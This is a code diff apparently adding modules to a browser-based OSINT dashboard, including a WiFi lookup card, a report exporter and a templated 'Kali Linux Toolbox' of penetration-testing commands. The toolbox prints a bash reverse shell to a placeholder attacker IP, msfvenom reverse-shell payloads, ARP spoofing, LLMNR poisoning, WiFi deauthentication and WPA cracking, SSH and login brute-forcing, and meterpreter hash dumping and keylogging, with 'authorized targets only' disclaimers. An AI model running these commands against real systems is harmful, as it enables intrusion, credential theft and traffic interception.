+      border-radius:4px;padding:10px 12px;font-family:var(--mono);font-size:10px;
+      color:var(--cyan2);margin-bottom:10px;line-height:1.8">
+      📡 WiGLE contains <strong style="color:#fff">billions of WiFi networks</strong> mapped globally.<br>
+      Search by SSID to find <strong style="color:#fff">physical locations</strong> of routers with that name.<br>
+      Search by BSSID for the exact router location on a map.
+    </div>
+    <div class="pg">
+      <a href="https://wigle.net/search#${isBSSID?'bssid='+enc:'ssid='+enc}" target="_blank"
+        class="pc pc-found" style="background:rgba(0,212,232,.1);border-color:rgba(0,212,232,.4)">
+        🌍 WiGLE Map Search</a>
+      <a href="https://wigle.net/search#essid=${enc}" target="_blank" class="pc pc-found">WiGLE SSID Search</a>
+      <a href="https://www.mylnikov.org/search?wifi=${enc}" target="_blank" class="pc pc-found">Mylnikov DB</a>
+      <a href="https://radiocells.org/network/${enc}" target="_blank" class="pc pc-found">Radiocells</a>
+    </div></div>` +
+
+    // SECURITY ANALYSIS
+    `<div class="sub"><div class="sub-hd">// 🔒 Security Analysis</div>
+    <div class="dg">
+      ${['tp-link','dlink','d-link','netgear','linksys','asus','belkin','huawei','xiaomi','tplink'].some(v=>clean.toLowerCase().includes(v)) ?
+        `<div class="dc"><div class="dl">⚠️ Default SSID</div>
+          <div class="dv dv-warn">Router brand visible — may use default password</div></div>` : ''}
+      ${/^(WiFi|Home|NETGEAR|DIRECT|AndroidAP|iPhone|TP-LINK|HUAWEI)/i.test(clean) ?
+        `<div class="dc"><div class="dl">⚠️ Generic SSID</div>
+          <div class="dv dv-warn">Common default name — often weakly secured</div></div>` : ''}
+      <div class="dc"><div class="dl">Hotspot Pattern</div>
+        <div class="dv">${/iPhone|Android|Galaxy|Pixel|DIRECT/i.test(clean)?'📱 Mobile Hotspot detected':'Not a hotspot pattern'}</div></div>
+      <div class="dc"><div class="dl">Hidden Network?</div>
+        <div class="dv">${clean.length===0?'Yes — empty SSID':'No — visible SSID'}</div></div>
+    </div></div>` +
+
+    // DEFAULT PASSWORD LOOKUP
+    `<div class="sub"><div class="sub-hd">// 🔑 Default Password Databases (Legal Use Only)</div>
+    <div class="pg">
+      <a href="https://www.routerpasswords.com" target="_blank" class="pc pc-found">RouterPasswords</a>
+      <a href="https://default-password.info" target="_blank" class="pc pc-found">Default-Password.info</a>
+      <a href="https://www.cirt.net/passwords" target="_blank" class="pc pc-found">CIRT.net</a>
+      <a href="https://www.google.com/search?q=%22${enc}%22+default+password+router" target="_blank" class="pc pc-found">Google Search</a>
+    </div></div>` +
+
+    // CVE / FIRMWARE
+    `<div class="sub"><div class="sub-hd">// 🐛 CVE & Firmware Vulnerabilities</div>
+    <div class="pg">
+      <a href="https://www.cvedetails.com/google-search-results.php?q=${encodeURIComponent(typeof vendorData==='string'?vendorData:clean)}" target="_blank" class="pc pc-found">CVE Details</a>
+      <a href="https://nvd.nist.gov/vuln/search/results?query=${enc}" target="_blank" class="pc pc-found">NIST NVD</a>
+      <a href="https://www.shodan.io/search?query=${isBSSID?'mac:'+enc:'wifi.ssid:'+enc}" target="_blank" class="pc pc-found">Shodan</a>
+    </div></div>`
+  );
+
+  pOk('build');
+  feed(`📡 Wireless: ${clean}`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: REPORT BUILDER
+═══════════════════════════════════════════════════════════ */
+async function doReport(caseName) {
+  initSteps([
+    {id:'gather', lbl:'Gathering session data'},
+    {id:'format', lbl:'Formatting intelligence report'},
+    {id:'build',  lbl:'Building PDF-ready report'},
+  ]);
+
+  pRun('gather');
+  // Collect all result cards from current session
+  const cards = document.querySelectorAll('.card');
+  const cardData = [];
+  cards.forEach(card => {
+    const title = card.querySelector('.card-title')?.textContent || '';
+    const target = card.querySelector('.card-target')?.textContent || '';
+    cardData.push({ title, target });
+  });
+  pOk('gather');
+
+  pRun('format');
+  const date = new Date().toISOString().slice(0,19).replace('T',' ');
+  const savedSessions = [];
+  for (let i = 0; i < localStorage.length; i++) {
+    const k = localStorage.key(i);
+    if (k?.startsWith('sess_')) {
+      try { savedSessions.push({ key:k, ...JSON.parse(localStorage.getItem(k)||'{}') }); } catch {}
+    }
+  }
+  pOk('format');
+
+  pRun('build');
+  stats.recs++;
+
+  mkCard('📊', 'INTELLIGENCE REPORT', 'b-info', caseName||'OSINT Session',
+    // REPORT HEADER
+    `<div style="background:linear-gradient(135deg,rgba(245,166,35,.08),rgba(0,212,232,.04));
+      border:1px solid rgba(245,166,35,.25);border-radius:5px;padding:14px 16px;margin-bottom:14px">
+      <div style="font-family:var(--display);font-size:16px;font-weight:800;color:#fff;margin-bottom:4px">
+        📊 SPECTRE INTELLIGENCE REPORT</div>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--text2)">
+        Case: <strong style="color:var(--amber)">${caseName||'Untitled'}</strong><br>
+        Generated: ${date} UTC<br>
+        Total Scans: ${stats.scans} &nbsp;|&nbsp; Records Found: ${stats.recs} &nbsp;|&nbsp; API Calls: ${stats.apis}<br>
+        Threats: ${stats.threats} &nbsp;|&nbsp; Breaches: ${stats.breaches}
+      </div>
+    </div>` +
+
+    // CURRENT SESSION FINDINGS
+    (cardData.length ? `
+    <div class="sub"><div class="sub-hd">// 📋 Current Session (${cardData.length} Intelligence Cards)</div>
+    <div class="dg">
+      ${cardData.map((c,i) => `
+      <div class="dc"><div class="dl">Finding ${i+1}</div>
+        <div class="dv"><strong>${c.title}</strong> — ${c.target}</div></div>`).join('')}
+    </div></div>` : '') +
+
+    // EXPORT OPTIONS
+    `<div class="sub"><div class="sub-hd">// 💾 Export Report</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
+      <button onclick="exportFullReport('${(caseName||'SPECTRE').replace(/'/g,"\\'")}','json')"
+        style="padding:12px;background:rgba(0,212,232,.1);border:1px solid var(--cyan);
+        border-radius:5px;color:var(--cyan2);cursor:pointer;font-family:var(--display);
+        font-size:11px;font-weight:700;letter-spacing:1px">
+        📄 EXPORT JSON<br><span style="font-size:9px;font-weight:400;color:var(--text3)">Machine-readable</span>
+      </button>
+      <button onclick="exportFullReport('${(caseName||'SPECTRE').replace(/'/g,"\\'")}','html')"
+        style="padding:12px;background:rgba(245,166,35,.1);border:1px solid var(--amber);
+        border-radius:5px;color:var(--amber2);cursor:pointer;font-family:var(--display);
+        font-size:11px;font-weight:700;letter-spacing:1px">
+        🌐 EXPORT HTML<br><span style="font-size:9px;font-weight:400;color:var(--text3)">Full styled report</span>
+      </button>
+      <button onclick="saveSession()"
+        style="padding:12px;background:rgba(0,230,118,.08);border:1px solid var(--green);
+        border-radius:5px;color:var(--green2);cursor:pointer;font-family:var(--display);
+        font-size:11px;font-weight:700;letter-spacing:1px">
+        💾 SAVE SESSION<br><span style="font-size:9px;font-weight:400;color:var(--text3)">To browser storage</span>
+      </button>
+      <button onclick="window.print()"
+        style="padding:12px;background:rgba(192,132,252,.08);border:1px solid var(--purple);
+        border-radius:5px;color:var(--purple);cursor:pointer;font-family:var(--display);
+        font-size:11px;font-weight:700;letter-spacing:1px">
+        🖨 PRINT / PDF<br><span style="font-size:9px;font-weight:400;color:var(--text3)">Browser print dialog</span>
+      </button>
+    </div></div>` +
+
+    // SAVED SESSIONS
+    (savedSessions.length ? `
+    <div class="sub"><div class="sub-hd">// 📂 Saved Sessions (${savedSessions.length})</div>
+    <div class="dg">
+      ${savedSessions.map(s => `
+      <div class="dc" style="display:flex;justify-content:space-between;align-items:center">
+        <div>
+          <div class="dv">${s.title||'Untitled'}</div>
+          <div class="dl">${s.date||''} — ${s.cards||0} cards</div>
+        </div>
+        <button onclick="loadSavedSession('${s.key}')"
+          style="background:var(--bg3);border:1px solid var(--line2);border-radius:3px;
+          color:var(--cyan2);cursor:pointer;font-family:var(--mono);font-size:10px;padding:4px 8px">
+          Load</button>
+      </div>`).join('')}
+    </div></div>` : '') +
+
+    // OPSEC REMINDER
+    `<div style="background:rgba(255,68,68,.06);border:1px solid rgba(255,68,68,.2);
+      border-radius:4px;padding:11px 13px;font-family:var(--mono);font-size:9px;
+      color:var(--text2);line-height:1.8">
+      🔒 <strong style="color:var(--red)">OPERATIONAL SECURITY REMINDER</strong><br>
+      All data collected from public sources only. Handle intelligence reports with appropriate confidentiality.<br>
+      Delete sessions containing sensitive information when no longer needed.
+    </div>`
+  );
+
+  pOk('build');
+  feed(`📊 Report: ${caseName||'Session'} — ${cardData.length} cards`, 'ok');
+  refreshStats();
+}
+
+function exportFullReport(title, fmt) {
+  const ts = new Date().toISOString().slice(0,10);
+  if (fmt === 'json') {
+    const cards = [...document.querySelectorAll('.card')].map(c => ({
+      title:  c.querySelector('.card-title')?.textContent,
+      target: c.querySelector('.card-target')?.textContent,
+      html:   c.innerHTML.slice(0,500)+'...'
+    }));
+    const blob = new Blob([JSON.stringify({
+      title, generated: new Date().toISOString(),
+      stats, cards
+    }, null, 2)], {type:'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `spectre-report-${ts}.json`;
+    a.click();
+  } else {
+    const html = document.documentElement.outerHTML;
+    const blob = new Blob([html], {type:'text/html'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `spectre-report-${ts}.html`;
+    a.click();
+  }
+}
+
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: KALI LINUX TOOLBOX
+═══════════════════════════════════════════════════════════ */
+async function doKali(target) {
+  initSteps([
+    {id:'recon',   lbl:'Passive recon commands'},
+    {id:'scan',    lbl:'Active scanning tools'},
+    {id:'web',     lbl:'Web application tools'},
+    {id:'wireless',lbl:'Wireless tools'},
+    {id:'post',    lbl:'Post-exploitation & reporting'},
+  ]);
+
+  const t = target.trim() || 'TARGET';
+  const enc = encodeURIComponent(t);
+
+  pRun('recon'); pOk('recon');
+  pRun('scan');  pOk('scan');
+  pRun('web');   pOk('web');
+  pRun('wireless'); pOk('wireless');
+  pRun('post');
+  stats.recs++;
+
+  mkCard('💀', 'KALI LINUX TOOLBOX', 'b-info', t,
+
+    // INSTALL KALI
+    `<div style="background:rgba(0,0,0,.4);border:1px solid rgba(0,230,118,.3);border-radius:6px;
+      padding:12px 14px;margin-bottom:14px;font-family:var(--mono);font-size:10px;color:var(--text2);line-height:2">
+      💀 <strong style="color:var(--green2)">All commands are for authorized targets only.</strong><br>
+      Run Kali on: WSL2 · VirtualBox · Bare metal · Kali NetHunter (Android) · Docker<br>
+      <code style="color:var(--amber)">docker run -it kalilinux/kali-rolling bash</code>
+    </div>` +
+
+    // ── PHASE 1: PASSIVE RECON ──
+    `<div class="sub"><div class="sub-hd">// 🔍 PHASE 1 — Passive Recon (No direct contact with target)</div>
+    <div class="code">
+<span class="cm"># theHarvester — emails, subdomains, IPs from search engines</span>
+<span class="cd">theHarvester</span> -d ${t} -b all -l 500 -f harvest_${t}
+
+<span class="cm"># DNSrecon — full DNS enumeration</span>
+<span class="cd">dnsrecon</span> -d ${t} -t std,axfr,brt,srv,rvl
+<span class="cd">dnsrecon</span> -d ${t} -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+<span class="cm"># DNSenum — zone transfer + brute force</span>
+<span class="cd">dnsenum</span> --noreverse -o dnsenum_${t}.xml ${t}
+
+<span class="cm"># Subfinder — passive subdomain discovery</span>
+<span class="cd">subfinder</span> -d ${t} -all -silent -o subs_${t}.txt
+
+<span class="cm"># Amass — most comprehensive subdomain enum</span>
+<span class="cd">amass</span> enum -passive -d ${t} -o amass_${t}.txt
+<span class="cd">amass</span> enum -active -d ${t} -brute -w /usr/share/wordlists/amass/subdomains-top1million-5000.txt
+
+<span class="cm"># WHOIS</span>
+<span class="cd">whois</span> ${t}
+
+<span class="cm"># Maltego (GUI) — visual link analysis</span>
+<span class="cd">maltego</span>
+
+<span class="cm"># Recon-ng — modular recon framework</span>
+<span class="cd">recon-ng</span>
+[recon-ng] > marketplace install all
+[recon-ng] > modules load recon/domains-hosts/hackertarget
+[recon-ng] > options set SOURCE ${t}
+[recon-ng] > run
+    </div></div>` +
+
+    // ── PHASE 2: SCANNING ──
+    `<div class="sub"><div class="sub-hd">// 🛰 PHASE 2 — Active Scanning (with authorization)</div>
+    <div class="code">
+<span class="cm"># Nmap — the ultimate port scanner</span>
+<span class="cm"># Basic scan</span>
+<span class="cd">nmap</span> -sV -sC ${t}
+<span class="cm"># Full comprehensive scan</span>
+<span class="cd">nmap</span> -sV -sC -A -T4 -p- --open -oA nmap_${t} ${t}
+<span class="cm"># Stealth SYN scan</span>
+<span class="cd">nmap</span> -sS -sV -O --reason -T2 ${t}
+<span class="cm"># UDP scan</span>
+<span class="cd">nmap</span> -sU --top-ports 200 ${t}
+<span class="cm"># Vulnerability scan with NSE scripts</span>
+<span class="cd">nmap</span> --script vuln ${t}
+<span class="cd">nmap</span> --script="http-*" -p 80,443,8080,8443 ${t}
+<span class="cm"># OS detection</span>
+<span class="cd">nmap</span> -O --osscan-guess ${t}
+
+<span class="cm"># Masscan — fastest port scanner</span>
+<span class="cd">masscan</span> -p1-65535 ${t} --rate=10000 -oX masscan_${t}.xml
+
+<span class="cm"># Netdiscover — local network host discovery</span>
+<span class="cd">netdiscover</span> -r 192.168.1.0/24
+
+<span class="cm"># ARP scan</span>
+<span class="cd">arp-scan</span> --localnet
+    </div></div>` +
+
+    // ── PHASE 3: WEB APP ──
+    `<div class="sub"><div class="sub-hd">// 🌐 PHASE 3 — Web Application Testing</div>
+    <div class="code">
+<span class="cm"># Nikto — web server vulnerability scanner</span>
+<span class="cd">nikto</span> -h https://${t} -o nikto_${t}.html -Format htm
+
+<span class="cm"># Gobuster — directory/file brute force</span>
+<span class="cd">gobuster</span> dir -u https://${t} -w /usr/share/wordlists/dirb/common.txt -t 50
+<span class="cd">gobuster</span> dir -u https://${t} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak
+<span class="cm"># Subdomain enum with gobuster</span>
+<span class="cd">gobuster</span> dns -d ${t} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+<span class="cm"># Feroxbuster — recursive content discovery</span>
+<span class="cd">feroxbuster</span> -u https://${t} -w /usr/share/seclists/Discovery/Web-Content/big.txt -r
+
+<span class="cm"># WhatWeb — fingerprint web tech</span>
+<span class="cd">whatweb</span> -a 3 https://${t}
+
+<span class="cm"># WAF detection</span>
+<span class="cd">wafw00f</span> https://${t}
+
+<span class="cm"># SQLmap — SQL injection (on authorized targets)</span>
+<span class="cd">sqlmap</span> -u "https://${t}/page?id=1" --dbs --batch --level=3
+
+<span class="cm"># SSLyze — SSL/TLS configuration audit</span>
+<span class="cd">sslyze</span> ${t}:443 --regular
+
+<span class="cm"># Burp Suite (GUI) — intercept proxy</span>
+<span class="cd">burpsuite</span> &
+
+<span class="cm"># OWASP ZAP — automated web scanner</span>
+<span class="cd">zaproxy</span> -daemon -host 127.0.0.1 -port 8090 -config api.addrs.addr.name=.\*
+    </div></div>` +
+
+    // ── PHASE 4: NETWORK SNIFFING ──
+    `<div class="sub"><div class="sub-hd">// 📡 PHASE 4 — Network Sniffing & Traffic Analysis</div>
+    <div style="background:rgba(255,68,68,.06);border:1px solid rgba(255,68,68,.2);
+      border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:9px;
+      color:var(--text3);margin-bottom:10px;line-height:1.8">
+      ⚠️ Sniffing applies only to networks you own or have written authorization to test.
+    </div>
+    <div class="code">
+<span class="cm"># Wireshark — GUI packet capture</span>
+<span class="cd">wireshark</span> &
+<span class="cm"># Capture on interface</span>
+<span class="cd">tshark</span> -i eth0 -w capture.pcap
+<span class="cm"># Filter HTTP traffic</span>
+<span class="cd">tshark</span> -i eth0 -f "tcp port 80" -Y "http.request"
+<span class="cm"># Extract creds from pcap</span>
+<span class="cd">tshark</span> -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
+
+<span class="cm"># tcpdump — CLI packet capture</span>
+<span class="cd">tcpdump</span> -i eth0 -n -s 0 -w out.pcap
+<span class="cd">tcpdump</span> -i eth0 port 443 -A
+
+<span class="cm"># Ettercap — MITM & ARP poisoning (LAN)</span>
+<span class="cd">ettercap</span> -G  <span class="cm"># GUI mode</span>
+<span class="cd">ettercap</span> -T -i eth0 -M arp:remote /${t}// /GATEWAY//
+
+<span class="cm"># Bettercap — modern MITM framework</span>
+<span class="cd">bettercap</span> -iface eth0
+[bettercap] > net.probe on
+[bettercap] > net.recon on
+[bettercap] > arp.spoof on
+
+<span class="cm"># Responder — LLMNR/NBT-NS poisoning</span>
+<span class="cd">responder</span> -I eth0 -rdw
+
+<span class="cm"># mitmproxy — HTTP/HTTPS intercept</span>
+<span class="cd">mitmproxy</span> -p 8080
+<span class="cd">mitmdump</span> -p 8080 -w traffic.pcap
+
+<span class="cm"># dsniff — password sniffer suite</span>
+<span class="cd">urlsnarf</span> -i eth0
+<span class="cd">webspy</span> -i eth0
+    </div></div>` +
+
+    // ── PHASE 5: WIRELESS ──
+    `<div class="sub"><div class="sub-hd">// 📶 PHASE 5 — Wireless Auditing</div>
+    <div class="code">
+<span class="cm"># Put adapter in monitor mode</span>
+<span class="cd">airmon-ng</span> start wlan0
+<span class="cm"># Check for processes that may interfere</span>
+<span class="cd">airmon-ng</span> check kill
+
+<span class="cm"># Airodump — scan all networks + capture</span>
+<span class="cd">airodump-ng</span> wlan0mon
+<span class="cm"># Target specific BSSID + channel</span>
+<span class="cd">airodump-ng</span> -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+<span class="cm"># Aireplay — deauth to capture handshake</span>
+<span class="cd">aireplay-ng</span> -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="cm"># Aircrack — WPA handshake crack</span>
+<span class="cd">aircrack-ng</span> -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+<span class="cm"># Hashcat — GPU accelerated crack (WPA)</span>
+<span class="cd">hcxdumptool</span> -i wlan0mon -o capture.pcapng --enable_status=1
+<span class="cd">hcxtools</span> pcapng2hashcat capture.pcapng -o hash.txt
+<span class="cd">hashcat</span> -m 22000 hash.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cm"># Wifite — automated wifi attack</span>
+<span class="cd">wifite</span> --wpa --dict /usr/share/wordlists/rockyou.txt
+
+<span class="cm"># Fern Wifi Cracker (GUI)</span>
+<span class="cd">fern-wifi-cracker</span>
+
+<span class="cm"># Reaver — WPS bruteforce</span>
+<span class="cd">reaver</span> -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+    </div></div>` +
+
+    // ── PHASE 6: EXPLOITATION ──
+    `<div class="sub"><div class="sub-hd">// ⚔️ PHASE 6 — Exploitation Framework</div>
+    <div class="code">
+<span class="cm"># Metasploit — the industry standard</span>
+<span class="cd">msfconsole</span>
+msf > search type:exploit platform:linux ${t}
+msf > use exploit/multi/handler
+msf > set LHOST 0.0.0.0
+msf > set LPORT 4444
+msf > run
+
+<span class="cm"># Generate reverse shell payload</span>
+<span class="cd">msfvenom</span> -p linux/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o shell.elf
+<span class="cd">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o shell.exe
+<span class="cd">msfvenom</span> -p php/meterpreter_reverse_tcp LHOST=YOURIP LPORT=4444 -f raw -o shell.php
+
+<span class="cm"># Social Engineering Toolkit</span>
+<span class="cd">setoolkit</span>
+
+<span class="cm"># SearchSploit — offline exploit database</span>
+<span class="cd">searchsploit</span> ${t}
+<span class="cd">searchsploit</span> apache 2.4
+<span class="cd">searchsploit</span> -m 44555 <span class="cm"># copy to current dir</span>
+    </div></div>` +
+
+    // ── PHASE 7: PASSWORDS ──
+    `<div class="sub"><div class="sub-hd">// 🔑 PHASE 7 — Password Attacks</div>
+    <div class="code">
+<span class="cm"># Hydra — online brute force</span>
+<span class="cd">hydra</span> -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://${t}
+<span class="cd">hydra</span> -l admin -P /usr/share/wordlists/rockyou.txt ${t} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+<span class="cd">hydra</span> -L users.txt -P passwords.txt ftp://${t}
+
+<span class="cm"># John the Ripper — offline hash cracking</span>
+<span class="cd">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+<span class="cd">john</span> --format=md5 --rules hashes.txt
+
+<span class="cm"># Hashcat — GPU cracking</span>
+<span class="cd">hashcat</span> -m 0 hash.txt /usr/share/wordlists/rockyou.txt    <span class="cm"># MD5</span>
+<span class="cd">hashcat</span> -m 1000 hash.txt wordlist.txt                      <span class="cm"># NTLM</span>
+<span class="cd">hashcat</span> -m 1800 hash.txt wordlist.txt --rules-file best64.rule <span class="cm"># SHA512crypt</span>
+
+<span class="cm"># CeWL — custom wordlist from target website</span>
+<span class="cd">cewl</span> https://${t} -d 3 -m 5 -w custom_wordlist.txt
+
+<span class="cm"># Crunch — generate wordlists</span>
+<span class="cd">crunch</span> 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
+    </div></div>` +
+
+    // ── PHASE 8: POST EXPLOIT ──
+    `<div class="sub"><div class="sub-hd">// 🏴 PHASE 8 — Post-Exploitation & Pivoting</div>
+    <div class="code">
+<span class="cm"># Meterpreter commands (after exploitation)</span>
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > run post/multi/gather/enum_system
+meterpreter > run post/linux/gather/enum_network
+meterpreter > screenshot
+meterpreter > keyscan_start
+
+<span class="cm"># Netcat — manual reverse shell</span>
+<span class="cm"># Attacker listens:</span>
+<span class="cd">nc</span> -lvnp 4444
+<span class="cm"># Target connects (bash):</span>
+bash -i >& /dev/tcp/YOURIP/4444 0>&1
+
+<span class="cm"># Proxychains — route traffic through proxy</span>
+<span class="cd">proxychains</span> nmap -sV ${t}
+<span class="cd">proxychains</span> firefox https://${t} &
+
+<span class="cm"># Chisel — TCP tunnel over HTTP</span>
+<span class="cd">chisel</span> server -p 8080 --reverse  <span class="cm"># on attacker</span>
+./chisel client YOURIP:8080 R:socks  <span class="cm"># on target</span>
+
+<span class="cm"># Ligolo-ng — modern tunneling</span>
+<span class="cd">ligolo-proxy</span> -selfcert -laddr 0.0.0.0:11601
+    </div></div>` +
+
+    // ── PHASE 9: OSINT TOOLS IN KALI ──
+    `<div class="sub"><div class="sub-hd">// 🕵️ PHASE 9 — OSINT Tools (Install on Kali)</div>
+    <div class="code">
+<span class="cm"># Install OSINT tools</span>
+<span class="cd">apt</span> install -y maltego recon-ng theharvester
+
+<span class="cm"># Sherlock — username hunting across 300+ sites</span>
+<span class="cd">pip3</span> install sherlock-project
+<span class="cd">sherlock</span> ${t} --timeout 10 --output sherlock_${t}.txt
+
+<span class="cm"># Maigret — OSINT by username (800+ sites)</span>
+<span class="cd">pip3</span> install maigret
+<span class="cd">maigret</span> ${t} --html --pdf
+
+<span class="cm"># PhoneInfoga — phone OSINT</span>
+<span class="cd">phoneinfoga</span> scan -n "${t}"
+<span class="cd">phoneinfoga</span> serve -p 8080
+
+<span class="cm"># Holehe — check email on 120+ sites</span>
+<span class="cd">pip3</span> install holehe
+<span class="cd">holehe</span> ${t}
+
+<span class="cm"># h8mail — breach hunting</span>
+<span class="cd">pip3</span> install h8mail
+<span class="cd">h8mail</span> -t ${t} --breach-parse
+
+<span class="cm"># Metagoofil — metadata from public documents</span>
+<span class="cd">metagoofil</span> -d ${t} -t pdf,doc,xls,ppt -o meta_output
+
+<span class="cm"># SpiderFoot — automated OSINT</span>
+<span class="cd">pip3</span> install spiderfoot
+<span class="cd">spiderfoot</span> -s ${t} -t EMAILADDR,PERSON,USERNAME,PHONE
+
+<span class="cm"># Exiftool — metadata from files</span>
+<span class="cd">exiftool</span> image.jpg
+<span class="cd">exiftool</span> -all= image.jpg  <span class="cm"># strip all metadata</span>
+    </div></div>` +
+
+    // ── REPORTING ──
+    `<div class="sub"><div class="sub-hd">// 📋 PHASE 10 — Reporting Tools</div>
+    <div class="code">
+<span class="cm"># Dradis — pentest reporting framework</span>
+<span class="cd">dradis</span>
+
+<span class="cm"># Faraday — collaborative pentest platform</span>
+<span class="cd">pip3</span> install faradaysec
+
+<span class="cm"># CherryTree — note taking</span>
+<span class="cd">cherrytree</span>
+
+<span class="cm"># Generate Nmap report</span>
+<span class="cd">xsltproc</span> nmap_${t}.xml -o report.html
+
+<span class="cm"># Convert pcap to readable report</span>
+<span class="cd">tshark</span> -r capture.pcap -T text > analysis.txt
+    </div></div>` +
+
+    // QUICK REFERENCE CARD
+    `<div class="sub"><div class="sub-hd">// ⚡ Quick Reference — One-Liners</div>
+    <div style="background:var(--bg0);border:1px solid var(--line2);border-radius:5px;padding:12px;
+      font-family:var(--mono);font-size:9px;color:var(--text2);line-height:2;column-count:2;column-gap:16px">
+      <strong style="color:var(--amber)">Recon</strong><br>
+      theHarvester -d ${t} -b all<br>
+      subfinder -d ${t} -silent<br>
+      dnsrecon -d ${t} -t std<br><br>
+      <strong style="color:var(--amber)">Scanning</strong><br>
+      nmap -sV -sC -p- ${t}<br>
+      masscan -p- ${t} --rate=5000<br>
+      nikto -h https://${t}<br><br>
+      <strong style="color:var(--amber)">Web</strong><br>
+      gobuster dir -u https://${t} -w big.txt<br>
+      whatweb -a 3 https://${t}<br>
+      wafw00f https://${t}<br><br>
+      <strong style="color:var(--amber)">Wireless</strong><br>
+      airmon-ng start wlan0<br>
+      airodump-ng wlan0mon<br>
+      wifite --wpa --dict rockyou.txt<br><br>
+      <strong style="color:var(--amber)">Passwords</strong><br>
+      hydra -L users.txt -P rockyou.txt ssh://${t}<br>
+      hashcat -m 0 hash.txt rockyou.txt<br>
+      john --wordlist=rockyou.txt hash.txt
+    </div></div>`
+  );
+
+  pOk('post');
+  feed(`💀 Kali toolbox: ${t}`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: FREE API REFERENCE
+═══════════════════════════════════════════════════════════ */
+async function doApiRef(query) {
+  initSteps([{id:'build', lbl:'Loading API reference'}]);
+  pRun('build');
+  stats.recs++;
+
+  mkCard('🔑', 'FREE API REFERENCE', 'b-info', 'All free APIs for OSINT',
+
+    // FREE TIER — NO KEY
+    `<div class="sub"><div class="sub-hd">// ✅ Completely Free — No API Key Required</div>
+    <div class="dg">
+      ${[
+        ['IPInfo.io',         'https://ipinfo.io/8.8.8.8/json',                  'IP geolocation, ASN, org, hostname','No key, 50k/mo free'],
+        ['Google DNS-over-HTTPS','https://dns.google/resolve?name=example.com&type=A','DNS lookups — A,AAAA,MX,NS,TXT','No key, unlimited'],
+        ['crt.sh',            'https://crt.sh/?q=example.com&output=json',        'SSL cert transparency — subdomain discovery','No key, unlimited'],
+        ['BGPView',           'https://api.bgpview.io/ip/8.8.8.8',               'ASN, BGP routes, IP prefix info','No key, unlimited'],
+        ['Wayback CDX',       'https://web.archive.org/cdx/search/cdx?url=...',   'Historical snapshots, first/last seen','No key, unlimited'],
+        ['RDAP',              'https://rdap.org/domain/example.com',              'WHOIS / registrar / dates (structured)','No key, unlimited'],
+        ['GitHub API',        'https://api.github.com/users/username',            'Repos, orgs, emails, activity','No key, 60 req/hr'],
+        ['NHTSA VIN',         'https://vpic.nhtsa.dot.gov/api/vehicles/decodevin/VIN?format=json','Full VIN decode — make/model/year','No key, unlimited'],
+        ['RestCountries',     'https://restcountries.com/v3.1/callingcode/965',   'Country data from phone code / name','No key, unlimited'],
+        ['MAC Vendors',       'https://api.macvendors.com/AABBCC',               'Router/device manufacturer from MAC OUI','No key, unlimited'],
+        ['Blockchain.info',   'https://blockchain.info/rawaddr/ADDRESS',          'BTC balance, transactions, history','No key, unlimited'],
+        ['Clearbit Autocomplete','https://autocomplete.clearbit.com/v1/companies/suggest?query=apple','Company logo, domain, name','No key, unlimited'],
+        ['IPwhois.io',        'https://ipwho.is/8.8.8.8',                        'IP country, city, ASN, timezone','No key, 10k/mo free'],
+        ['HackerNews API',    'https://hacker-news.firebaseio.com/v0/user/USER.json','HN user info + karma','No key, unlimited'],
+        ['Reddit API',        'https://www.reddit.com/user/USER/about.json',      'Reddit account info, karma, age','No key, unlimited'],
+      ].map(([name, url, desc, limit]) => `
+      <div class="dc" style="margin-bottom:6px">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start">
+          <div class="dv dv-ok" style="font-size:11px">${name}</div>
+          <span style="font-family:var(--mono);font-size:9px;color:var(--green2);
+            background:rgba(0,230,118,.08);border:1px solid rgba(0,230,118,.2);
+            padding:1px 6px;border-radius:2px;flex-shrink:0;margin-left:6px">${limit}</span>
+        </div>
+        <div class="dl">${desc}</div>
+        <div style="font-family:var(--mono);font-size:9px;color:var(--text3);
+          word-break:break-all;margin-top:2px">${url}
+          <button class="cpbtn" onclick="cp('${url}')">COPY</button>
+        </div>
+      </div>`).join('')}
+    </div></div>` +
+
+    // FREE TIER WITH KEY
+    `<div class="sub"><div class="sub-hd">// 🔑 Free Tier — API Key Required (All Free to Register)</div>
+    <div class="dg">
+      ${[
+        ['VirusTotal',      'https://virustotal.com/gui/sign-in',           '500 lookups/day','URLs, IPs, domains, files — malware/threat intel'],
+        ['AbuseIPDB',       'https://www.abuseipdb.com/register',           '1000 checks/day','IP reputation, abuse reports, threat score'],
+        ['HaveIBeenPwned',  'https://haveibeenpwned.com/API/Key',           '10 req/min free','Email/domain breach check — 12+ billion accounts'],
+        ['NumVerify',       'https://numverify.com',                        '250 calls/month','Phone carrier, line type, location, validity'],
+        ['Hunter.io',       'https://hunter.io/users/sign_up',             '25 searches/month','Employee email discovery, domain email finder'],
